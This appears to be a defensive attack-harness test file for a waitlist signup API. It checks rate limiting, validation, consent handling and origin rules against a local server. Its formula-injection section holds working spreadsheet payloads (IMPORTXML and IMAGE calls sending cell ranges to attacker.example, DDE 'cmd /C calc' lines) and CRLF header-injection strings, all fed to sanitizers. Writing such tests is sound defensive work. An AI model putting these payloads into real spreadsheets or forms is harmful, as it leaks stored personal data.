/**
 * Attack harness for POST /api/waitlist.
 *
 *   node scripts/attack-waitlist.mjs
 *
 * Boots the real handler behind a local HTTP server and attacks it. A fix you
 * have not attacked is a hypothesis, so every control in api/waitlist.js has a
 * case here that fails loudly if the control is removed.
 *
 * This never touches production. It deliberately leaves SHEETS_WEBHOOK_URL
 * unset, so the handler accepts and logs rather than forwarding anywhere.
 */

import http from 'node:http';
import net from 'node:net';
import { fileURLToPath } from 'node:url';

process.env.NODE_ENV = 'test';
delete process.env.SHEETS_WEBHOOK_URL;
delete process.env.UPSTASH_REDIS_REST_URL;

const { default: handler } = await import('../api/waitlist.js');

// ─── Server ──────────────────────────────────────────────────────────────────

const server = http.createServer((req, res) => {
  handler(req, res).catch((err) => {
    console.error('handler threw:', err);
    res.statusCode = 500;
    res.end('{"ok":false,"error":"server"}');
  });
});

await new Promise((r) => server.listen(0, '127.0.0.1', r));
const BASE = `http://127.0.0.1:${server.address().port}`;

// ─── Client ──────────────────────────────────────────────────────────────────

let ipCounter = 0;
/** Each case gets a fresh source IP so rate-limit state does not bleed between tests. */
function freshIp() {
  ipCounter += 1;
  return `198.51.100.${ipCounter % 250}`;
}

async function post(body, { ip = freshIp(), contentType = 'application/json', method = 'POST', raw = null, headers = {} } = {}) {
  const payload = raw ?? JSON.stringify(body);
  const res = await fetch(`${BASE}/api/waitlist`, {
    method,
    headers: {
      ...(contentType ? { 'Content-Type': contentType } : {}),
      'x-real-ip': ip,
      ...headers,
    },
    body: method === 'GET' || method === 'HEAD' ? undefined : payload,
  });
  let json = null;
  try {
    json = await res.json();
  } catch {
    /* empty body */
  }
  return { status: res.status, json, headers: res.headers };
}

/** A payload that passes every check, as the baseline to mutate from. */
function goodPayload(overrides = {}) {
  return {
    email: `real.person+${Math.random().toString(36).slice(2, 8)}@gmail.com`,
    consent_marketing: true,
    form_render_ts: Date.now() - 9000,
    ...overrides,
  };
}

// ─── Runner ──────────────────────────────────────────────────────────────────

const results = [];
let failures = 0;

async function check(name, expectation, fn) {
  try {
    const detail = await fn();
    const pass = detail.pass;
    if (!pass) failures += 1;
    results.push({ name, expectation, actual: detail.actual, pass });
  } catch (err) {
    failures += 1;
    results.push({ name, expectation, actual: `threw: ${err.message}`, pass: false });
  }
}

// 1 — happy path
await check('Valid minimal payload', '200 ok:true', async () => {
  const r = await post(goodPayload());
  return { pass: r.status === 200 && r.json?.ok === true, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

// 2 — method enforcement
for (const method of ['GET', 'PUT', 'DELETE', 'PATCH']) {
  await check(`Method ${method} rejected`, '405', async () => {
    const r = await post(null, { method, raw: '{}' });
    return { pass: r.status === 405, actual: `${r.status} ${JSON.stringify(r.json)}` };
  });
}

// 3 — content type enforcement (also the CSRF control)
await check('Content-Type: text/plain rejected', '415', async () => {
  const r = await post(goodPayload(), { contentType: 'text/plain' });
  return { pass: r.status === 415, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Content-Type: form-urlencoded rejected (cross-origin form CSRF)', '415', async () => {
  const r = await post(goodPayload(), { contentType: 'application/x-www-form-urlencoded' });
  return { pass: r.status === 415, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

// 4 — body size
await check('1 MB body rejected', '413', async () => {
  const huge = JSON.stringify({ ...goodPayload(), page_path: 'A'.repeat(1024 * 1024) });
  const r = await post(null, { raw: huge });
  return { pass: r.status === 413, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Chunked oversized body (no Content-Length) rejected', '413', async () => {
  // The declared-size check cannot help here: a chunked request sends no
  // Content-Length at all, so only the byte counter in the read loop catches
  // it. Driven over a raw socket rather than fetch() — undici discards an
  // early response if it arrives while it is still uploading, which would
  // measure the client instead of the server.
  const status = await new Promise((resolve) => {
    const sock = net.connect(server.address().port, '127.0.0.1');
    let buf = '';
    sock.on('connect', () => {
      sock.write(
        'POST /api/waitlist HTTP/1.1\r\n' +
          `Host: 127.0.0.1:${server.address().port}\r\n` +
          'Content-Type: application/json\r\n' +
          'x-real-ip: 198.51.100.251\r\n' +
          'Transfer-Encoding: chunked\r\n\r\n'
      );
      // 20 × 16 KB chunks = 320 KB, forty times the 8 KB cap.
      const chunk = 'B'.repeat(16 * 1024);
      for (let i = 0; i < 20; i++) sock.write(`${chunk.length.toString(16)}\r\n${chunk}\r\n`);
      sock.write('0\r\n\r\n');
    });
    sock.on('data', (d) => {
      buf += d.toString();
      const m = buf.match(/^HTTP\/1\.1 (\d{3})/);
      if (m) {
        resolve(Number(m[1]));
        sock.destroy();
      }
    });
    sock.on('error', () => resolve(0));
    sock.on('close', () => resolve(buf.match(/^HTTP\/1\.1 (\d{3})/)?.[1] ?? 0));
    setTimeout(() => {
      sock.destroy();
      resolve(0);
    }, 5000);
  });
  return { pass: status === 413, actual: String(status) };
});

// 5 — mass assignment / unknown keys
await check('Unknown key {"isAdmin":true} rejected', '400 validation', async () => {
  const r = await post(goodPayload({ isAdmin: true }));
  return { pass: r.status === 400 && r.json?.error === 'validation', actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Unknown key in utm object rejected', '400 validation', async () => {
  const r = await post(goodPayload({ utm: { source: 'x', evil: 'y' } }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

// 6 — header injection
await check('CRLF in page_path rejected', '400 validation', async () => {
  const r = await post(goodPayload({ page_path: '/x\r\nBcc: victim@example.com' }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('CRLF in email rejected', '400 validation', async () => {
  const r = await post(goodPayload({ email: 'a@b.com\r\nBcc: victim@example.com' }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('RTL override char in utm.campaign rejected', '400 validation', async () => {
  const r = await post(goodPayload({ utm: { campaign: 'safe‮evil' } }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

// 7 — consent
await check('consent_marketing missing rejected', '400 validation', async () => {
  const p = goodPayload();
  delete p.consent_marketing;
  const r = await post(p);
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('consent_marketing:false rejected', '400 validation', async () => {
  const r = await post(goodPayload({ consent_marketing: false }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('consent_marketing:"true" (string) rejected', '400 validation', async () => {
  const r = await post(goodPayload({ consent_marketing: 'true' }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

// 8 — enum and length enforcement
await check('motivation with 4 entries rejected', '400 validation', async () => {
  const r = await post(goodPayload({ consent_health: true, motivation: ['digestion', 'energy', 'other', 'gut_health'] }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('motivation with invalid enum rejected', '400 validation', async () => {
  const r = await post(goodPayload({ consent_health: true, motivation: ['cancer'] }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('zip "9430" (4 digits) rejected', '400 validation', async () => {
  const r = await post(goodPayload({ zip: '9430' }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('page_path over 200 chars rejected', '400 validation', async () => {
  const r = await post(goodPayload({ page_path: '/' + 'a'.repeat(300) }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

// 9 — email quality
for (const [email, why] of [
  ['admin@zucasnacks.com', 'role address'],
  ['postmaster@example.com', 'role address'],
  ['throwaway@mailinator.com', 'disposable'],
  ['no-at-sign', 'malformed'],
  ['a..b@example.com', 'double dot'],
  ['x@example', 'no TLD'],
]) {
  await check(`Email "${email}" rejected (${why})`, '400 validation', async () => {
    const r = await post(goodPayload({ email }));
    return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
  });
}

// 10 — bot layers
await check('Filled honeypot silently discarded', '200 ok:true, not stored', async () => {
  const r = await post(goodPayload({ hp_field: 'http://spam.example' }));
  return { pass: r.status === 200 && r.json?.ok === true, actual: `${r.status} ${JSON.stringify(r.json)} (log shows reject.bot honeypot)` };
});
await check('Sub-2-second submission rejected as bot', '200 ok:true, not stored', async () => {
  const r = await post(goodPayload({ form_render_ts: Date.now() - 500 }));
  return { pass: r.status === 200, actual: `${r.status} ${JSON.stringify(r.json)} (log shows reject.bot too_fast)` };
});
await check('Human-speed submission (9s) accepted', '200 ok:true, stored', async () => {
  const r = await post(goodPayload({ form_render_ts: Date.now() - 9000 }));
  return { pass: r.status === 200 && r.json?.ok === true, actual: `${r.status} ${JSON.stringify(r.json)} (log shows accepted)` };
});

// 11 — origin
await check('Cross-origin POST rejected', '403', async () => {
  const r = await post(goodPayload(), { headers: { Origin: 'https://evil.example' } });
  return { pass: r.status === 403, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Own-origin POST accepted', '200', async () => {
  const r = await post(goodPayload(), { headers: { Origin: 'https://zucasnacks.com' } });
  return { pass: r.status === 200, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

// 12 — malformed JSON
for (const [raw, label] of [
  ['not json at all', 'garbage'],
  ['[]', 'array'],
  ['"string"', 'bare string'],
  ['null', 'null'],
  ['{"email":', 'truncated'],
]) {
  await check(`Malformed body (${label}) rejected`, '400 validation', async () => {
    const r = await post(null, { raw });
    return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
  });
}

// 13 — rate limiting: 100 rapid requests from one IP
await check('100 rapid requests from one IP', 'first 5 → 200, rest → 429', async () => {
  const ip = '203.0.113.77';
  const codes = [];
  for (let i = 0; i < 100; i++) {
    const r = await post(goodPayload(), { ip });
    codes.push(r.status);
  }
  const ok = codes.filter((c) => c === 200).length;
  const limited = codes.filter((c) => c === 429).length;
  return {
    pass: ok === 5 && limited === 95,
    actual: `${ok}×200, ${limited}×429, ${codes.length - ok - limited} other`,
  };
});

await check('429 carries Retry-After', 'header present', async () => {
  const ip = '203.0.113.88';
  let last;
  for (let i = 0; i < 8; i++) last = await post(goodPayload(), { ip });
  return {
    pass: last.status === 429 && Boolean(last.headers.get('retry-after')),
    actual: `${last.status}, Retry-After: ${last.headers.get('retry-after')}`,
  };
});

await check('429 body leaks no internals', 'exactly {"ok":false,"error":"rate_limited"}', async () => {
  const ip = '203.0.113.99';
  let last;
  for (let i = 0; i < 8; i++) last = await post(goodPayload(), { ip });
  const keys = Object.keys(last.json ?? {}).sort().join(',');
  return { pass: keys === 'error,ok' && last.json.error === 'rate_limited', actual: JSON.stringify(last.json) };
});

await check('Spoofed X-Forwarded-For does not reset the limiter', 'still 429', async () => {
  const ip = '203.0.113.55';
  for (let i = 0; i < 6; i++) await post(goodPayload(), { ip });
  const r = await post(goodPayload(), { ip, headers: { 'X-Forwarded-For': '1.2.3.4' } });
  return { pass: r.status === 429, actual: `${r.status}` };
});

// 14 — formula injection (unit-level: the value that would reach the sheet)
{
  const { sanitizeForSheet, sanitizeRecord } = await import('../src/lib/validation.js');
  const payloads = [
    '=IMPORTXML(CONCAT("https://attacker.example/?d=",JOIN(",",A1:E500)),"//a")',
    '+HYPERLINK("https://attacker.example","click")',
    '-2+3+cmd|\' /C calc\'!A0',
    '@SUM(1+1)*cmd|\' /C calc\'!A0',
    '=IMAGE("https://attacker.example/pixel?d="&A2)',
  ];
  for (const p of payloads) {
    await check(`Formula payload neutralized: ${p.slice(0, 34)}…`, "prefixed with ' → inert text", async () => {
      const out = sanitizeForSheet(p);
      return { pass: out.startsWith("'") && !/^[=+\-@]/.test(out), actual: out.slice(0, 46) + '…' };
    });
  }
  await check('Tab-escape formula payload neutralized', "prefixed with '", async () => {
    const out = sanitizeForSheet('\t=IMPORTXML("https://attacker.example","//a")');
    return { pass: out.startsWith("'"), actual: out.slice(0, 40) };
  });
  await check('sanitizeRecord reaches nested utm values', "utm.source prefixed with '", async () => {
    const out = sanitizeRecord({ email: 'a@b.com', utm: { source: '=1+1' } });
    return { pass: out.utm.source === "'=1+1", actual: JSON.stringify(out.utm) };
  });
}

// 15 — health-adjacent data requires separate consent
{
  await check('motivation dropped when consent_health is absent', 'stored as null', async () => {
    const { validateWaitlist } = await import('../src/lib/validation.js');
    const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, motivation: ['gut_health'] });
    const stored = v.ok && v.data.consent_health ? v.data.motivation : null;
    return { pass: stored === null, actual: `consent_health=${v.data?.consent_health}, stored motivation=${JSON.stringify(stored)}` };
  });
  await check('motivation kept when consent_health is true', 'stored', async () => {
    const { validateWaitlist } = await import('../src/lib/validation.js');
    const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, consent_health: true, motivation: ['gut_health'] });
    const stored = v.ok && v.data.consent_health ? v.data.motivation : null;
    return { pass: Array.isArray(stored) && stored[0] === 'gut_health', actual: JSON.stringify(stored) };
  });
}

// 16 — normalization
{
  const { validateWaitlist } = await import('../src/lib/validation.js');
  await check('Email uppercased + padded is normalized', 'lowercased and trimmed', async () => {
    const v = validateWaitlist({ email: '  Real.Person@GMAIL.com  ', consent_marketing: true });
    return { pass: v.ok && v.data.email === 'real.person@gmail.com', actual: JSON.stringify(v.data?.email ?? v.issues) };
  });
  await check('Zero-width char in email stripped (duplicate-evasion)', 'normalizes to same address', async () => {
    const v = validateWaitlist({ email: 'real​.person@gmail.com', consent_marketing: true });
    return { pass: v.ok && v.data.email === 'real.person@gmail.com', actual: JSON.stringify(v.data?.email ?? v.issues) };
  });
  await check('Full-width @ normalized via NFKC', 'becomes a normal address', async () => {
    const v = validateWaitlist({ email: 'person＠gmail.com', consent_marketing: true });
    return { pass: v.ok && v.data.email === 'person@gmail.com', actual: JSON.stringify(v.data?.email ?? v.issues) };
  });
  await check('Duplicate motivation values collapsed', 'deduplicated', async () => {
    const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, consent_health: true, motivation: ['energy', 'energy'] });
    return { pass: v.ok && v.data.motivation.length === 1, actual: JSON.stringify(v.data?.motivation ?? v.issues) };
  });
}

// 17 — consent evidence (contract amendment): server-derived, not client-supplied
//
// The burst cases above deliberately exhaust the global ceiling, so clear the
// limiter first — otherwise everything below returns 429 and passes or fails
// for reasons that have nothing to do with what it is testing.
{
  const { __resetInMemoryLimiter } = await import('../src/lib/ratelimit.js');
  __resetInMemoryLimiter();
}

await check('Client-supplied country rejected', '400 validation', async () => {
  const r = await post(goodPayload({ country: 'US' }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Client-supplied consent_timestamp rejected', '400 validation', async () => {
  const r = await post(goodPayload({ consent_timestamp: '1999-01-01T00:00:00Z' }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Client-supplied consent_receipt rejected', '400 validation', async () => {
  const r = await post(goodPayload({ consent_receipt: '{"marketing":true}' }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Registered consent_text_version accepted', '200', async () => {
  const r = await post(goodPayload({ consent_text_version: '2026-08-15.marketing.a' }));
  return { pass: r.status === 200, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Unregistered consent_text_version accepted but flagged', '200, logged', async () => {
  // Deliberate: rejecting would mean a copy change that forgets to register a
  // wording breaks every signup on the site.
  const r = await post(goodPayload({ consent_text_version: 'never-registered.v9' }));
  return {
    pass: r.status === 200,
    actual: `${r.status} (log: consent.unregistered_text_version)`,
  };
});
await check('Malformed consent_text_version rejected', '400 validation', async () => {
  const r = await post(goodPayload({ consent_text_version: 'bad version!<script>' }));
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

{
  const { deriveCountry, isEea, resolveConsentText } = await import('../src/lib/validation.js');
  const mk = (h) => ({ headers: h });

  await check('country derived from x-vercel-ip-country', 'NO', async () => {
    const c = deriveCountry(mk({ 'x-vercel-ip-country': 'no' }));
    return { pass: c === 'NO', actual: c };
  });
  await check('country falls back to XX when absent', 'XX', async () => {
    const c = deriveCountry(mk({}));
    return { pass: c === 'XX', actual: c };
  });
  await check('malformed country header rejected, not stored', 'XX', async () => {
    const c = deriveCountry(mk({ 'x-vercel-ip-country': '=IMPORTXML("http://evil","//a")' }));
    return { pass: c === 'XX', actual: c };
  });
  await check('EEA classification: NO/DE/GB in, US/BR/SG out', 'correct', async () => {
    const inEea = ['NO', 'DE', 'GB', 'IS'].every(isEea);
    const outEea = ['US', 'BR', 'SG', 'JP', 'KR', 'MX', 'XX'].every((c) => !isEea(c));
    return { pass: inEea && outEea, actual: `in=${inEea} out=${outEea}` };
  });
  await check('unknown consent version resolves to registry_match:false', 'flagged', async () => {
    const r = resolveConsentText('nope.v1');
    return { pass: r.registry_match === false && r.text === null, actual: JSON.stringify(r) };
  });
  await check('absent consent version resolves to "unspecified"', 'unspecified', async () => {
    const r = resolveConsentText(null);
    return { pass: r.version === 'unspecified', actual: JSON.stringify(r) };
  });
}

// 18 — motivation_consent_text_version as its own field
await check('motivation_consent_text_version accepted as a separate field', '200', async () => {
  const r = await post(
    goodPayload({
      consent_health: true,
      motivation: ['gut_health'],
      consent_text_version: '2026-08-15.marketing.a',
      motivation_consent_text_version: '2026-08-15.health.a',
    })
  );
  return { pass: r.status === 200, actual: `${r.status} ${JSON.stringify(r.json)}` };
});
await check('Two identifiers joined with "+" rejected', '400 validation', async () => {
  // The shape growth was forced into before this field existed. `+` is outside
  // the permitted charset precisely so a packed pair cannot masquerade as one id.
  const r = await post(
    goodPayload({ consent_text_version: '2026-08-15.marketing.a+2026-08-15.health.a' })
  );
  return { pass: r.status === 400, actual: `${r.status} ${JSON.stringify(r.json)}` };
});

// 19 — regime reconciliation
{
  const { reconcileConsentRegime, consentRegime } = await import('../src/lib/validation.js');

  await check('consentRegime tokenises rather than substring-matches', 'no false US match', async () => {
    const safe = consentRegime('2026-08-15.august.a'); // contains "us" inside a word
    const real = consentRegime('mkt-us-2026-08.a');
    return { pass: safe !== 'us' && real === 'us', actual: `august→${safe}, mkt-us→${real}` };
  });

  await check('EEA visitor shown US marketing copy → flagged', 'needs_reconsent', async () => {
    const r = reconcileConsentRegime({ country: 'NO', marketingVersion: 'mkt-us-2026-08.a' });
    return { pass: r.needs_reconsent === true, actual: r.reason ?? 'not flagged' };
  });

  await check('UK visitor shown US marketing copy → flagged', 'needs_reconsent', async () => {
    const r = reconcileConsentRegime({ country: 'GB', marketingVersion: 'mkt-us-2026-08.a' });
    return { pass: r.needs_reconsent === true, actual: r.reason ?? 'not flagged' };
  });

  await check('EEA visitor shown US health copy → flagged', 'needs_reconsent', async () => {
    const r = reconcileConsentRegime({
      country: 'DE',
      marketingVersion: 'mkt-eu-2026-08.a',
      healthVersion: 'health-us-2026-08.a',
    });
    return { pass: r.needs_reconsent === true && r.reason.startsWith('health'), actual: r.reason ?? 'not flagged' };
  });

  await check('Both consents US, visitor in EEA → both named in reason', 'marketing+health', async () => {
    const r = reconcileConsentRegime({
      country: 'NO',
      marketingVersion: 'mkt-us-2026-08.a',
      healthVersion: 'health-us-2026-08.a',
    });
    return { pass: r.reason?.startsWith('marketing+health'), actual: r.reason ?? 'not flagged' };
  });

  await check('EEA visitor shown EEA copy → not flagged', 'clean', async () => {
    const r = reconcileConsentRegime({ country: 'NO', marketingVersion: 'mkt-eu-2026-08.a' });
    return { pass: r.needs_reconsent === false, actual: JSON.stringify(r) };
  });

  await check('US visitor shown US copy → not flagged', 'clean', async () => {
    const r = reconcileConsentRegime({ country: 'US', marketingVersion: 'mkt-us-2026-08.a' });
    return { pass: r.needs_reconsent === false, actual: JSON.stringify(r) };
  });

  await check('US visitor shown EEA copy → not flagged (over-protection is fine)', 'clean', async () => {
    const r = reconcileConsentRegime({ country: 'US', marketingVersion: 'mkt-eu-2026-08.a' });
    return { pass: r.needs_reconsent === false, actual: JSON.stringify(r) };
  });

  await check('Unknown country (XX) not treated as EEA', 'clean', async () => {
    const r = reconcileConsentRegime({ country: 'XX', marketingVersion: 'mkt-us-2026-08.a' });
    return { pass: r.needs_reconsent === false, actual: JSON.stringify(r) };
  });

  await check('Health version ignored when health consent not granted', 'clean', async () => {
    // The endpoint passes healthVersion: null unless consent_health is true.
    const r = reconcileConsentRegime({ country: 'NO', marketingVersion: 'mkt-eu-2026-08.a', healthVersion: null });
    return { pass: r.needs_reconsent === false, actual: JSON.stringify(r) };
  });
}

// 20 — end-to-end: the receipt covers BOTH consents independently
{
  const { __resetInMemoryLimiter } = await import('../src/lib/ratelimit.js');
  __resetInMemoryLimiter();

  await check('Receipt records marketing and health separately, each with its own version', 'v2 shape', async () => {
    // Rebuild what the handler builds, from the same helpers it uses.
    const { resolveConsentText, reconcileConsentRegime, isEea } = await import('../src/lib/validation.js');
    const m = resolveConsentText('2026-08-15.marketing.a', 'marketing');
    const h = resolveConsentText('2026-08-15.health.a', 'health');
    const rec = reconcileConsentRegime({
      country: 'NO',
      marketingVersion: '2026-08-15.marketing.a',
      healthVersion: '2026-08-15.health.a',
    });
    const receipt = {
      schema: 'zuca.consent.v2',
      marketing: { granted: true, version: m.version, text: m.text, registry_match: m.registry_match },
      health: { granted: true, version: h.version, text: h.text, registry_match: h.registry_match },
      country: 'NO',
      regime: isEea('NO') ? 'eea' : 'other',
      reconciliation: rec,
    };
    const ok =
      receipt.marketing.text?.startsWith('Email me when pre-orders open') &&
      receipt.health.text?.startsWith('Store my reason for interest') &&
      receipt.marketing.version !== receipt.health.version &&
      receipt.health.version === '2026-08-15.health.a';
    return {
      pass: Boolean(ok),
      actual: `mkt=${receipt.marketing.version}, health=${receipt.health.version}`,
    };
  });
}

// 18 — no PII in responses
await check('Error response never echoes submitted input', 'no email in body', async () => {
  const r = await post(goodPayload({ email: 'canary-string@mailinator.com' }));
  const body = JSON.stringify(r.json);
  return { pass: !body.includes('canary-string'), actual: body };
});

// ─── Report ──────────────────────────────────────────────────────────────────

server.close();

const pad = (s, n) => String(s).padEnd(n).slice(0, n);
console.log('\n' + '═'.repeat(112));
console.log('  ATTACK RESULTS — POST /api/waitlist');
console.log('═'.repeat(112));
console.log(`  ${pad('CASE', 54)} ${pad('EXPECTED', 26)} ${pad('ACTUAL', 22)} `);
console.log('─'.repeat(112));
for (const r of results) {
  console.log(`${r.pass ? '  ✓ ' : '  ✗ '}${pad(r.name, 52)} ${pad(r.expectation, 26)} ${pad(r.actual, 22)}`);
}
console.log('─'.repeat(112));
console.log(`  ${results.length - failures}/${results.length} passed${failures ? `  —  ${failures} FAILED` : ''}`);
console.log('═'.repeat(112) + '\n');

if (fileURLToPath(import.meta.url) === process.argv[1]) {
  process.exit(failures ? 1 : 0);
}
